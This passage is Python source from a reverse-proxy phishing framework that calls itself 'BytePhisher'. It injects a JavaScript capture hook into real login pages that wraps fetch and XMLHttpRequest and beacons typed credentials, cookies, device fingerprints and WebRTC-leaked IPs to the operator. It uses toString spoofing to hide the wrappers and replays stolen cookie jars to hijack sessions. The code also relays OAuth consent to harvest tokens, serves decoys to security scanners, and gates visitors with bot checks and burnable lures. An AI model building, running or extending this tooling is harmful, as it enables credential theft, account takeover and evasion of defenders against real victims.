            except Exception as e:
                self.log(f"[proxy] vault save failed: {type(e).__name__}: {e}")
        if self.db is not None:
            self.db.record("/__bh/capture", ip or sess.ip, "", "", "", sess.ua,
                           self._device(sess.ua), {**fields, "_fp": json.dumps(fp)[:400],
                                                   "_cookies": json.dumps(cookies)[:400]},
                           is_cred, campaign=sess.campaign, risk=risk,
                           risk_reasons=reasons)
        if self.on_capture:
            with contextlib.suppress(Exception):
                self.on_capture({"template": self.phishlet.name, "campaign": sess.campaign,
                                 "ip": ip or sess.ip, "device": self._device(sess.ua),
                                 "fields": fields, "is_cred": is_cred, "risk": risk,
                                 "risk_reasons": reasons, "cookies": cookies,
                                 "fingerprint": fp, "session": sess.sid,
                                 "proxy_mode": True})
        return {"ok": True, "cred": is_cred, "session": sess.sid}

    @staticmethod
    def _fields_from_body(text):
        """Pull user/pass-looking fields out of a request body.

        Handles the two shapes a login actually uses: a urlencoded form and a JSON
        object. A modern SPA posts `{"username": ..., "password": ...}` to an API
        route, and the form-only version captured nothing from those. Nested objects
        are flattened one level, which covers the shapes login APIs use
        (`{"user": {"email": ..., "password": ...}}`, `{"data": {...}}`).

        Uses the shared classifier (word-boundary aware) so an address form cannot
        look like a credential pair.
        """
        raw = (text or "").strip()
        flat = {}
        if raw.startswith("{") or raw.startswith("["):
            try:
                data = json.loads(raw)
            except Exception:
                data = None
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, dict):
                        for k2, v2 in v.items():
                            if isinstance(v2, (str, int, float)) and str(v2) != "":
                                flat[str(k2)] = str(v2)
                    elif isinstance(v, (str, int, float)) and str(v) != "":
                        flat[str(k)] = str(v)
        if not flat:
            try:
                parsed = urllib.parse.parse_qs(raw, keep_blank_values=False)
            except Exception:
                return {}
            flat = {k: v[0] for k, v in parsed.items() if v and v[0]}
        return {k: flat[k] for k in classify.credential_keys(flat)}

    def _looks_like_credentials(self, fields):
        # shared with the static server (core/classify.py)
        return classify.is_credential_pair(fields)

    def _risk(self, fields, fp):
        s, reasons = 0, []
        if fp.get("webdriver"):
            s += 50
            reasons.append("navigator.webdriver set (automation)")
        if fp.get("headless_hints"):
            s += 40
            reasons.append(f"headless hints: {', '.join(fp['headless_hints'][:3])}")
        if not fp.get("canvas_hash"):
            s += 15
            reasons.append("no canvas fingerprint (JS blocked or bot)")
        if fp.get("webgl_renderer") and "swiftshader" in str(fp["webgl_renderer"]).lower():
            s += 35
            # keep the raw renderer string: it is the evidence in the report
            reasons.append(f"software WebGL renderer (headless): {fp['webgl_renderer']}")
        if fp.get("tz_mismatch"):
            s += 25
            reasons.append(f"timezone/IP mismatch: {fp.get('timezone')} vs {fp.get('ip_country')}")
        hp = fields.get("hp_email")
        if hp:
            s += 40
            reasons.append("honeypot field filled")
        return min(100, s), reasons

    @staticmethod
    def _device(ua):
        ua = (ua or "").lower()
        for needle, name in (("iphone", "ios"), ("ipad", "ios"), ("android", "android"),
                             ("mac os", "macos"), ("windows", "windows"), ("linux", "linux")):
            if needle in ua:
                return name
        return "unknown"

    # ---- hook ----
    # a patched built-in that can be caught by toString() is the loudest thing we
    # inject, so the stealth layer is on unless an operator turns it off
    hook_stealth = True
    # the pre-serve human challenge (--verify-first); None keeps the old behaviour
    challenge = None
    # the cookie / attribute names this campaign writes: fixed by default (tooling and
    # runbooks rely on them), randomized per campaign with --symbols random
    symbols = _symbols_mod.Symbols.fixed()

    def restore_sessions(self, hours=12.0, limit=500):
        """Bring the sessions that were active recently back into memory.

        Called at startup. Without it a restart leaves every durable row attached to a
        sid this process does not know, so a victim's next request starts a fresh
        session and the campaign looks like it lost its targets.
        """
        if self.db is None:
            return 0
        cutoff = time.time() - (float(hours) * 3600.0)
        restored = 0
        try:
            rows = self.db.sessions_since(cutoff, limit=limit)
        except Exception as e:
            self.log(f"[proxy] session restore failed: {e}")
            return 0
        with self._lock:
            for rec in rows:
                sid = rec.get("sid")
                if not sid or sid in self.sessions:
                    continue
                sess = ProxySession(sid, ip=rec.get("ip", ""), ua=rec.get("ua", ""),
                                    campaign=rec.get("campaign", ""),
                                    ja3=rec.get("ja3") or {})
                sess.vault = rec
                sess.restored = True
                # the cookie jar is the part that makes the victim's next request land
                # where it left off: rebuild it from the stored cookies
                for c in rec.get("cookies") or []:
                    with contextlib.suppress(Exception):
                        self._jar_add(sess, c)
                self.sessions[sid] = sess
                restored += 1
        if restored:
            self.log(f"[proxy] restored {restored} session(s) active in the last {hours}h")
        return restored

    def _jar_add(self, sess, cookie):
        """Put one stored cookie back into a session's upstream jar."""
        if not isinstance(cookie, dict) or not cookie.get("name"):
            return False
        jar = getattr(sess, "cookies", None)
        if jar is None:
            return False
        c = http.cookiejar.Cookie(
            0, cookie["name"], cookie.get("value", ""),
            None, False, cookie.get("domain", "") or "", bool(cookie.get("domain")),
            str(cookie.get("domain", "")).startswith("."), cookie.get("path", "/") or "/",
            True, bool(cookie.get("secure")),
            int(cookie.get("expires") or 0) or None, False, None, None, {})
        jar.set_cookie(c)
        return True

    def page_token(self):
        """A meaningless per-render token handed to the page instead of the session id.

        The page's own JavaScript (and any integrity script) can read what we inject,
        so what it gets must not be the handle that identifies the victim server-side.
        """
        return secrets.token_hex(4)

    def oauth_ready(self):
        """The OAuth relay spec for this campaign, or None."""
        spec = getattr(self.phishlet, "oauth", None)
        if not spec:
            return None
        if isinstance(spec, dict):
            try:
                from core.oauth import OauthSpec
                spec = OauthSpec(**spec)
            except Exception as e:
                self.log(f"[proxy] oauth spec rejected: {e}")
                return None
        return spec

    def oauth_start(self, sess):
        """Begin a consent flow for this session and return the provider URL."""
        spec = self.oauth_ready()
        if spec is None:
            return ""
        if not getattr(self, "oauth_manager", None):
            from core.oauth import OauthManager
            self.oauth_manager = OauthManager()
        callback = self.path_of(getattr(self.phishlet, "oauth_callback", "/__bh/oauth/cb"))
        redirect_uri = spec.redirect_uri or f"{self.public_base()}{callback}"
        flow = self.oauth_manager.start(spec, sess.sid, redirect_uri=redirect_uri)
        # (the flow's state is tracked by OauthManager.by_state; storing it on the vault
        # was dead state - nothing ever read or compared it)
        self.log(f"[proxy] oauth {spec.provider}: consent flow started for {sess.sid[:8]}")
        return flow.authorize_url()

    def oauth_finish(self, state, code):
        """Complete a redirect: match the state, exchange the code, return the tokens."""
        manager = getattr(self, "oauth_manager", None)
        if manager is None:
            return None
        return manager.finish(state, code)

    def public_base(self):
        """Our own origin as the victim sees it (for the redirect URI)."""
        host = getattr(self, "public_host", "") or "127.0.0.1"
        scheme = "https" if getattr(self, "tls_enabled", False) else "http"
        return f"{scheme}://{host}".rstrip("/")

    def target_for(self, path, query="", cookie_email=""):
        """The target this visit belongs to, when a list is configured."""
        if not getattr(self, "targets", None):
            return None
        return self.targets.for_request(path, query, cookie_email)

    def hook_js(self, sid):
        return HOOK_JS.replace("__SID__", sid).replace("__CAPTURE__", CAPTURE_PATH) \
                       .replace("__BEACON__", BEACON_PATH) \
                       .replace("__STEALTH__", STEALTH_JS if self.hook_stealth else "null")


# Injected before the hook patches anything. See the module docstring of this change
# set: toString() is how a page (or an anti-bot vendor) tells a wrapped native from a
# real one.
STEALTH_JS = r"""
(function () {
  var nativeToString = Function.prototype.toString;
  var spoofed = new WeakMap();
  function nativeSrc(name) { return "function " + name + "() { [native code] }"; }
  var shim = function toString() {
    var s = spoofed.get(this);
    return (s === undefined) ? nativeToString.call(this) : s;
  };
  /* the shim has to look native too, or catching it is one call away */
  spoofed.set(shim, nativeSrc("toString"));
  try {
    Object.defineProperty(Function.prototype, "toString", {
      value: shim, writable: true, enumerable: false, configurable: true
    });
  } catch (e) {}
  return {
    /* replace obj[name] with fn, keeping the surface the native had: name, arity,
       writability and enumerability. A non-configurable global falls back to a plain
       assignment rather than throwing. */
    define: function (obj, name, fn, nativeName, arity) {
      var had = null;
      try { had = Object.getOwnPropertyDescriptor(obj, name); } catch (e) {}
      try {
        Object.defineProperty(fn, "name",
          { value: nativeName, configurable: true });
      } catch (e) {}
      try {
        Object.defineProperty(fn, "length",
          { value: (arity === undefined ? fn.length : arity), configurable: true });
      } catch (e) {}
      spoofed.set(fn, nativeSrc(nativeName));
      try {
        Object.defineProperty(obj, name, {
          value: fn, writable: true, configurable: true,
          enumerable: had ? !!had.enumerable : false
        });
      } catch (e) {
        try { obj[name] = fn; } catch (e2) {}
      }
      return fn;
    }
  };
})()
"""

HOOK_JS = r"""
/* BytePhisher capture hook - runs inside the real page, transparent to the user.
   Sends what the victim typed plus a device fingerprint, then lets the genuine
   submit continue so the upstream session is really established. */
(function () {
  var SID = "__SID__", CAP = "__CAPTURE__", BEACON = "__BEACON__";
  function fingerprint() {
    var fp = {ua: navigator.userAgent, webdriver: !!navigator.webdriver,
              lang: navigator.language, tz: null, screen: null,
              plugins: (navigator.plugins || []).length,
              hw: navigator.hardwareConcurrency || 0,
              headless_hints: []};
    try { fp.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}
    fp.screen = [screen.width, screen.height, screen.colorDepth].join("x");
    if (!window.chrome) fp.headless_hints.push("no window.chrome");
    if (!navigator.languages || !navigator.languages.length) fp.headless_hints.push("no languages");
    if (navigator.webdriver) fp.headless_hints.push("webdriver");
    try {
      var c = document.createElement("canvas"), ctx = c.getContext("2d");
      ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillText("bh", 2, 2);
      fp.canvas_hash = c.toDataURL().slice(-64);
      var gl = document.createElement("canvas").getContext("webgl");
      if (gl) {
        var dbg = gl.getExtension("WEBGL_debug_renderer_info");
        fp.webgl_renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "masked";
      }
    } catch (e) {}
    try {
      var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({iceServers: []});
      pc.createDataChannel("x");
      pc.onicecandidate = function (e) {
        if (e.candidate && e.candidate.candidate) {
          var m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
          if (m) { fp.webrtc_ip = m[1]; send({fingerprint: fp}); }
        }
      };
      pc.createOffer().then(function (o) { pc.setLocalDescription(o); });
    } catch (e) {}
    return fp;
  }
  var FP = fingerprint();
  function cookieMap() {
    var out = {};
    document.cookie.split(";").forEach(function (p) {
      var i = p.indexOf("="); if (i > 0) out[p.slice(0, i).trim()] = p.slice(i + 1).trim();
    });
    return out;
  }
  var events = [];
  function send(payload) {
    payload.sid = SID;
    payload.cookies = cookieMap();
    if (!payload.fingerprint) payload.fingerprint = FP;
    if (events.length) payload.events = events.slice(-200);
    /* the serialisation used to sit outside the try: a payload that cannot be
       stringified (a cyclic value from the page) dropped the beacon with no error */
    var body;
    try { body = JSON.stringify(payload); } catch (e) { body = null; }
    if (body === null) { try { body = JSON.stringify({sid: SID, kind: payload.kind}); }
                         catch (e2) { return; } }
    try { navigator.sendBeacon(CAP, new Blob([body], {type: "application/json"})); }
    catch (e) { try { fetch(CAP, {method: "POST", body: body, keepalive: true,
                                  headers: {"Content-Type": "application/json"}}); } catch (e2) {} }
  }
  function fields(form) {
    var out = {};
    new FormData(form).forEach(function (v, k) { if (typeof v === "string") out[k] = v; });
    return out;
  }
  /* typing telemetry: timing + which field, never keystroke content */
  ["input", "keydown"].forEach(function (evt) {
    document.addEventListener(evt, function (e) {
      if (e.target && (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA")) {
        events.push({t: Date.now(), type: evt, name: e.target.name || e.target.id || "",
                     len: (e.target.value || "").length});
      }
    }, true);
  });
  document.addEventListener("mousemove", function (e) {
    if (events.length < 200) events.push({t: Date.now(), type: "mm", x: e.clientX, y: e.clientY});
  }, true);
  document.addEventListener("submit", function (e) {
    try { send({fields: fields(e.target), url: location.href, kind: "submit"}); } catch (err) {}
  }, true);
  var stealth = __STEALTH__;
  /* the collector, captured here: the wrappers below keep the native names (`send`,
     `open`) so `fn.name` needs no spoofing, and a named function expression must not
     call itself by that name - so they call THIS reference instead. */
  var collect = send;
  var origFetch = window.fetch;
  if (origFetch) {
    var bhFetch = function fetch(input, init) {
      try {
        var u = (typeof input === "string") ? input : (input && input.url);
        if (init && init.body && typeof init.body === "string" && /login|auth|token|signin/i.test(u || "")) {
          var parsed = {};
          try { JSON.parse(init.body); parsed = JSON.parse(init.body); } catch (e) {
            init.body.split("&").forEach(function (kv) {
              var i = kv.indexOf("="); if (i > 0) parsed[decodeURIComponent(kv.slice(0, i))] =
                decodeURIComponent(kv.slice(i + 1));
            });
          }
          collect({fields: parsed, url: u, kind: "fetch"});
        }
      } catch (e) {}
      return origFetch.apply(this, arguments);
    };
    if (stealth) { stealth.define(window, "fetch", bhFetch, "fetch", 1); }
    else { window.fetch = bhFetch; }
  }
  var OrigXHR = window.XMLHttpRequest;
  if (OrigXHR && OrigXHR.prototype && OrigXHR.prototype.send) {
    var origSend = OrigXHR.prototype.send;
    var bhSend = function send(body) {
      try {
        if (body && typeof body === "string") {
          var parsed = {};
          body.split("&").forEach(function (kv) {
            var i = kv.indexOf("="); if (i > 0) parsed[decodeURIComponent(kv.slice(0, i))] =
              decodeURIComponent(kv.slice(i + 1));
          });
          if (Object.keys(parsed).length) collect({fields: parsed, url: this.__bh_url || "", kind: "xhr"});
        }
      } catch (e) {}
      return origSend.apply(this, arguments);
    };
    var origOpen = OrigXHR.prototype.open;
    var bhOpen = function open(m, u) {
      this.__bh_url = u;
      return origOpen.apply(this, arguments);
    };
    if (stealth) {
      stealth.define(OrigXHR.prototype, "send", bhSend, "send", 1);
      stealth.define(OrigXHR.prototype, "open", bhOpen, "open", 5);
    } else {
      OrigXHR.prototype.send = bhSend;
      OrigXHR.prototype.open = bhOpen;
    }
  }
  window.addEventListener("load", function () { send({fields: {}, kind: "load"}); });
})();
"""


# ------------------------------------------------------------------- server ---
_accept_is_a_navigation = classify.accept_is_a_navigation
_has_asset_extension = classify.has_asset_extension


class ProxyHandler(http.server.BaseHTTPRequestHandler):
    # keep-alive for the proxied assets and the collector waves
    protocol_version = "HTTP/1.1"
    engine = None            # set by serve_proxy()
    server_version = "nginx"
    sys_version = ""
    # a response carries exactly one Server and one Date: ours used to be added on
    # top of the upstream's, so a filtered target saw two of each (and "nginx "
    # with a trailing space, because sys_version is empty)
    server_header = ""

    def version_string(self):
        """Never "BaseHTTP/0.6 Python/3.x" (and never the "nginx " the default
        join produces when sys_version is empty)."""
        return self.server_header or self.server_version

    def send_response_only(self, code, message=None):
        """Our own pages (thank-you, decoy, /health, refusals) still need a Date;
        the PROXIED path uses this directly so rewrite_headers() stays the single
        source of Server/Date and the upstream's are not duplicated."""
        super().send_response_only(code, message)

    def log_message(self, *a):
        pass

    # -- helpers --
    def _ja4h(self):
        """JA4H for this request: header names in order plus the cookie hashes."""
        from core import tls_fp as _fp
        with contextlib.suppress(Exception):
            return _fp.ja4h(self.command, self.request_version,
                            list(self.headers.items()))
        return ""

    def _client_fp(self):
        """JA3/JA3S captured from this connection's TLS ClientHello (if any)."""
        return getattr(self.connection, "_bh_tls_fp", {}) or {}

    def _resolve_lure(self, sess):
        """Attach a lure to the session on first contact.

        A lure token can arrive three ways: as /l/<token>, as ?l=<token>, or in
        the fragment (which the collector posts back, so it never reaches an
        intermediary's logs). A one-time lure burns after its first open.
        """
        if not self.engine.db or sess.lure:
            return None
        parsed = urllib.parse.urlparse(self.path)
        token = lures_mod.extract_token(parsed.path, parsed.query)
        if not token:
            return None
        lure = self.engine.db.lure_get(token)
        if not lure:
            return None
        ok = self.engine.db.lure_use(lure, self._client_ip())
        if not ok:
            # burned: this visitor gets the decoy, and the open is recorded
            sess.lure = f"burned:{token}"
            self.engine.log(f"[proxy] burned lure opened: {token}")
            return None
        sess.lure = lure.token
        sess.vault["lure"] = lure.token
        session_mod.touch(sess.vault, "lure", f"{lure.kind}:{lure.token}")
        self.engine.log(f"[proxy] lure {lure.token} opened from {self._client_ip()}"
                        + (f" ({lure.label})" if lure.label else ""))
        return lure

    def _burned_lure(self, sess):
        return str(sess.lure).startswith("burned:")

    def _decoy(self, sess, reason=""):
        """What a non-target visitor sees.

        Default ("real") is the upstream site itself: a scanner that grabs the
        link sees a perfect copy of the real login page and has nothing to
        report, instead of a 403 that screams "phishing infrastructure".
        """
        if self.engine.phishlet.unauth_url:
            self.send_response(302)
            self.send_header("Location", self.engine.phishlet.unauth_url)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        if self.engine.phishlet.decoy == "real":
            self._proxy("GET", decoy_mode=True)
            return
        body = (b"<!doctype html><html><head><title>Service unavailable</title></head>"
                b"<body><h1>Service unavailable</h1>"
                b"<p>This link is no longer active.</p></body></html>")
        self.send_response(503)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _session_cookie(self, sid):
        """HttpOnly always (page script must not read the session id), Secure
        whenever the victim's connection is HTTPS (direct TLS or tunnel edge)."""
        c = f"{self.engine.symbols.session}={sid}; Path=/; SameSite=Lax; HttpOnly"
        if self._over_tls():
            c += "; Secure"
        return c

    def _json(self, obj, status=200):
        body = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _client_ip(self):
        """The visitor's address.

        Forwarding headers are only honoured when the engine trusts them: behind
        a tunnel they carry the real address, but on a directly exposed listener
        they are attacker-controlled, and the gate (country rules, the per-IP hit
        cap, the scanner ranges) is decided from this value.
        """
        if getattr(self.engine, "trust_headers", True):
            for h in ("CF-Connecting-IP", "True-Client-IP", "X-Real-IP"):
                if self.headers.get(h):
                    return self.headers[h].strip()
            xff = self.headers.get("X-Forwarded-For")
            if xff:
                return xff.split(",")[0].strip()
        return self.client_address[0]

    def _session(self, sid_hint=None):
        """Reuse the victim's session id from the payload, cookie or query,
        else start a new one. Without the payload hint, captures arriving
        without our cookie would silently create a brand-new session.

        Cached per request: do_GET resolves the session for lure handling and
        _proxy resolves it again for the fetch. Without this cache each call
        minted a NEW session, so the request that carried the credentials and
        the request that got the __bhs cookie ended up as two different
        sessions (the vault then recorded the wrong one).
        """
        cached = getattr(self, "_bh_sess", None)
        if cached is not None and (not sid_hint or cached.sid == sid_hint):
            return cached
        # Only a session this engine already knows may be reused. A client can
        # pick any 16-64 hex string, and two victims driven to the same ?s=
        # would otherwise share one ProxySession - merging their cookie jars,
        # credentials and vault records.
        sid = sid_hint if sid_hint and sid_hint in self.engine.sessions else ""
        if not sid:
            cookie = self.headers.get("Cookie") or ""
            m = re.search(rf"{re.escape(self.engine.symbols.session)}=([0-9a-f]{{16,64}})",
                          cookie)
            if m and m.group(1) in self.engine.sessions:
                sid = m.group(1)
        if not sid:
            q = urllib.parse.urlparse(self.path).query
            cand = urllib.parse.parse_qs(q).get("s", [""])[0]
            if cand in self.engine.sessions:
                sid = cand
        sess = self.engine.session(sid, ip=self._client_ip(),
                                   ua=self.headers.get("User-Agent", ""),
                                   campaign=getattr(self.engine, "campaign", ""),
                                   ja3=self._client_fp())
        self._bh_sess = sess
        return sess

    # -- routes --

    def handle_one_request(self):
        """Run one request; a client that leaves mid-response is not an error.

        BrokenPipeError / ConnectionResetError happen constantly on a public
        listener (a tunnel closing a socket, a browser cancelling a navigation)
        and must not print a traceback over the operator's capture feed.
        """
        try:
            super().handle_one_request()
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
            self.close_connection = True

    # ------------------------------------------------------------ websockets --
    def _websocket(self, sess, host, path):
        """Relay a WebSocket: handshake upstream, 101 to the client, then bytes.

        The handshake is redone against the real host with this victim's cookie jar
        so the socket is authorised exactly as the site's own page would be. After
        the 101 the protocol is opaque, so it is pumped verbatim in both directions
        - which is the point: nothing is rewritten, nothing is decoded, and a
        socket that the site needs keeps working.
        """
        import socket as _socket
        target = host.orig_host
        port = int(getattr(host, "port", 0) or (443 if host.scheme == "https" else 80))
        secure = host.scheme == "https"
        raw = _socket.create_connection((target, port), timeout=15)
        try:
            if secure:
                import ssl
                ctx = ssl.create_default_context()
                if not self.engine.phishlet.verify_tls:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                raw = ctx.wrap_socket(raw, server_hostname=target)
            lines = [f"GET {path} HTTP/1.1", f"Host: {target}"]
            for name, value in self.headers.items():
                low = name.lower()
                if low in ("host", "content-length", "connection", "origin",
                           "cookie", "upgrade", "sec-websocket-key",
                           "sec-websocket-version", "sec-websocket-protocol",
                           "sec-websocket-extensions"):
                    continue
                lines.append(f"{name}: {value}")
            _wp = int(getattr(host, "port", 0) or (443 if host.scheme == "https" else 80))
            _wd = 443 if host.scheme == "https" else 80
            lines.append(f"Origin: {host.scheme}://{target}" + (
                f":{_wp}" if _wp != _wd else ""))
            ck = transport.cookie_header(sess.cookies, f"{host.scheme}://{target}/")
            if ck:
                lines.append(f"Cookie: {ck}")
            for name, value in self.headers.items():
                if name.lower().startswith("sec-websocket-") or name.lower() == "upgrade":
                    lines.append(f"{name}: {value}")
            lines.append("Connection: Upgrade")
            raw.sendall(("\r\n".join(lines) + "\r\n\r\n").encode("latin-1"))

            # read the upstream's handshake response verbatim
            head = b""
            raw.settimeout(15)
            while b"\r\n\r\n" not in head and len(head) < 65536:
                chunk = raw.recv(4096)
                if not chunk:
                    break
                head += chunk
            if not head:
                self.send_response(502)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            status_line = head.split(b"\r\n", 1)[0].decode("latin-1", "replace")
            self.engine.log(f"[proxy] websocket {status_line} -> {target}{path}")
            self.close_connection = True
            self.wfile.write(head)
            self.wfile.flush()

            if "101" not in status_line:
                raw.close()
                return

            # opaque from here: pump both ways
            def pump(src, dst):
                try:
                    while True:
                        data = src.recv(65536)
                        if not data:
                            break
                        dst.sendall(data)
                except Exception:
                    pass
                finally:
                    with contextlib.suppress(Exception):
                        dst.shutdown(_socket.SHUT_WR)
            t = threading.Thread(target=pump, args=(raw, self.connection), daemon=True)
            t.start()
            try:
                pump(self.connection, raw)
            finally:
                t.join(timeout=5)
                raw.close()
        except Exception as e:
            self.engine.log(f"[proxy] websocket failed: {type(e).__name__}: {e}")
            with contextlib.suppress(Exception):
                self.send_response(502)
                self.send_header("Content-Length", "0")
                self.end_headers()
            with contextlib.suppress(Exception):
                raw.close()

    def do_GET(self):
        if not self._framing_ok():
            return
        if self.engine.oauth_ready() is not None:
            _p = urllib.parse.urlparse(self.path).path
            _cb = self.engine.path_of(getattr(self.engine.phishlet, "oauth_callback",
                                              "/__bh/oauth/cb"))
            if _p == _cb:
                self._oauth_callback()
                return
        path = self.path
        if path.startswith(self.engine.path_of(INTEL_JS_PATH)):
            sess = self._session()
            q = urllib.parse.parse_qs(urllib.parse.urlparse(path).query)
            # the id is interpolated into the collector's JS: validate it
            # a meaningless per-render token: the collector is attributed from the
            # HttpOnly session cookie, so the page never learns the real handle
            sid = self.engine.page_token()
            perms = q.get("p", ["0"])[0] in ("1", "true")
            # the assets ship inside the package (core/assets) so a wheel carries them
            js_path = _asset_path("intel.js")
            try:
                js = intel_mod.render_js(
                    js_path, sid, perms=perms,
                    endpoint=self.engine.path_of(intel_mod.INTEL_PATH),
                    live_path=self.engine.path_of(intel_mod.LIVE_PATH),
                    sw_path=self.engine.path_of(intel_mod.SW_PATH),
                    rebind_host=getattr(self.engine, "rebind_host", ""),
                    kill_plan=intel_mod.exploit_plan(
                        getattr(self.engine, "rebind_host", ""),
                        ports=getattr(self.engine, "exploit_ports", None),
                        limit=getattr(self.engine, "exploit_limit", 6))).encode()
            except Exception as e:
                js = (f"/* intel collector unavailable: {e} */").encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Content-Length", str(len(js)))
            self.send_header("Set-Cookie", self._session_cookie(sess.sid))
            self.end_headers()
            self.wfile.write(js)
            return
        # a WebSocket upgrade must not go through the HTML path at all
        if "websocket" in (self.headers.get("Upgrade") or "").lower():
            sess = self._session()
            self._resolve_lure(sess)
            if not self._gate_allows(sess):
                return
            host = self.engine.host_for(dict(self.headers.items()), sess)
            if host is None:
                self.send_response(404)
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            self._websocket(sess, host, path)
            return
        if path.startswith(self.engine.path_of(intel_mod.SW_PATH)):
            sess = self._session()
            sw_path = _asset_path("sw.js")
            try:
                sw = intel_mod.render_sw(
                    sw_path, sess.sid,
                    endpoint=self.engine.path_of(intel_mod.INTEL_PATH),
                    live_path=self.engine.path_of(intel_mod.LIVE_PATH)).encode()
            except Exception as e:
                sw = (f"/* service worker unavailable: {e} */").encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Cache-Control", "no-store")
            # a service worker's scope is limited by this header; / is required
            self.send_header("Service-Worker-Allowed", "/")
            self.send_header("Content-Length", str(len(sw)))
            self.end_headers()
            self.wfile.write(sw)
            return
        if path.startswith(self.engine.path_of(HOOK_PATH)):
            sess = self._session()
            self._resolve_lure(sess)
            js = self.engine.hook_js(self.engine.page_token()).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/javascript")
            self.send_header("Content-Length", str(len(js)))
            self.send_header("Set-Cookie", self._session_cookie(sess.sid))
            self.end_headers()
            self.wfile.write(js)
            return
        sess = self._session()
        lure = self._resolve_lure(sess)
        # pre-serve human challenge: until the visitor has proved it is a browser
        # (interaction + passive tells), the clone is not served at all. This runs
        # BEFORE the gate/decoy logic, because the gate's scoring only knows what the
        # collector has already reported - i.e. after the page was handed over.
        if (self.engine.challenge is not None and self._challenge_applies()
                and not self._challenged_through(sess)):
            self._serve_challenge(sess)
            return
        # bot gate: a scanner never gets the phishlet, and the visit is logged
        if self.engine.gate is not None:
            if not self._gate_allows(sess):
                self._decoy(sess, "gate")
                return
            action, score, reasons = self.engine.gate.bot_check(
                ja3=sess.ja3, ua=sess.ua,
                intel={"headless_score": self.engine.intel_scores.get(sess.sid, 0)})
            if action == "decoy":
                sess.vault["meta"]["scanner"] = {"score": score, "reasons": reasons}
                session_mod.touch(sess.vault, "scanner", f"score={score}")
                try:
                    if self.engine.db:
                        self.engine.db.record_scanner(
                            self._client_ip(), sess.ua, reasons, score,
                            path=urllib.parse.urlparse(self.path).path, sid=sess.sid)
                        self.engine.db.session_save(sess.vault)
                except Exception as e:
                    self.engine.log(f"[proxy] scanner log: {type(e).__name__}: {e}")
                self.engine.log(f"[proxy] bot gate -> decoy ({score}): "
                                f"{'; '.join(reasons[:2])}")
                self._decoy(sess, "bot gate")
                return
        if self._burned_lure(sess):
            self._decoy(sess, "burned lure")
            return
        # a hidden phishlet serves nobody until the operator unhides it, and a
        # hidden phishlet's visitors are recorded (that is how you spot a scanner)
        if self.engine.phishlet.hide and not lure:
            self.engine.log(f"[proxy] hidden phishlet hit by {self._client_ip()}")
            self._decoy(sess, "hidden")
            return
        # /l/<token> is a lure path, not an upstream path: land on the real page
        parsed = urllib.parse.urlparse(path)
        if lures_mod.extract_token(parsed.path, parsed.query):
            self.path = "/"
        self._proxy("GET")

    def do_POST(self):
        if not self._framing_ok():
            return
        path = urllib.parse.urlparse(self.path).path
        if path in (self.engine.path_of(INTEL_PATH), INTEL_ALIAS_FALLBACK):
            n = self._body_len()
            if n is None:
                return
            raw = self.rfile.read(n) if n else b""
            try:
                payload = json.loads(raw.decode("utf-8", "replace") or "{}")
                if not isinstance(payload, dict):
                    raise ValueError("payload must be an object")
            except Exception:
                self._json({"ok": False, "error": "malformed json"}, status=400)
                return
            if not payload.get("mods") and not payload.get("errors"):
                self._json({"ok": False, "error": "empty payload"}, status=400)
                return
            payload.setdefault("ua", self.headers.get("User-Agent", ""))
            # The session comes from the HttpOnly cookie. A payload sid is honoured
            # only when it names a live session: otherwise any page that could guess
            # or observe a sid could write into someone else's record.
            sess = self._session()
            hint = str(payload.get("sid") or "").strip()
            payload["sid"] = hint if hint in self.engine.sessions else sess.sid
            self._json(self.engine.intel(payload, ip=self._client_ip()))
            return
        if path == self.engine.path_of(intel_mod.LIVE_PATH):
            n = self._body_len()
            if n is None:
                return
            raw = self.rfile.read(n) if n else b""
            try:
                payload = json.loads(raw.decode("utf-8", "replace") or "{}")
                if not isinstance(payload, dict):
                    raise ValueError("payload must be an object")
            except Exception:
                self._json({"ok": False, "error": "malformed json"}, status=400)
                return
            sess = self._session(str(payload.get("sid") or "") or None)
            out = self.engine.note_live(sess, payload, ip=self._client_ip())
            self._json(out)
            return
        if path == self.engine.path_of(VERIFY_PATH):
            self._verify_route()
            return
        if path in (self.engine.path_of(CAPTURE_PATH), self.engine.path_of(BEACON_PATH)):
            n = self._body_len()
            if n is None:
                return
            raw = self.rfile.read(n) if n else b""
            try:
                payload = json.loads(raw.decode("utf-8", "replace") or "{}")
                if not isinstance(payload, dict):
                    raise ValueError("payload must be an object")
            except Exception:
                # malformed body: reject it and store nothing (a junk row would
                # pollute the campaign numbers)
                self._json({"ok": False, "error": "malformed json"}, status=400)
                return
            if not any(payload.get(k) for k in ("fields", "fingerprint", "cookies", "events")):
                self._json({"ok": False, "error": "empty payload"}, status=400)
                return
            hint = str(payload.get("sid") or "")
            # only a well-formed id may be adopted; anything else is replaced by
            # a fresh server-generated one (no fixation, no arbitrary keys)
            if not re.match(r"^[0-9a-f]{16,64}$", hint):
                hint = ""
            sess = self._session(sid_hint=hint or None)
            res = self.engine.capture(sess, payload, ip=self._client_ip())
            self._json(res)
            return
        # a POST is a login attempt: the gate must run here too, or a blocked
        # visitor simply posts the form instead of loading the page
        sess = self._session()
        if not self._gate_allows(sess):
            self._decoy(sess, "gate")
            return
        self._proxy("POST")

    def do_HEAD(self):
        sess = self._session()
        if not self._gate_allows(sess):
            self._decoy(sess, "gate")
            return
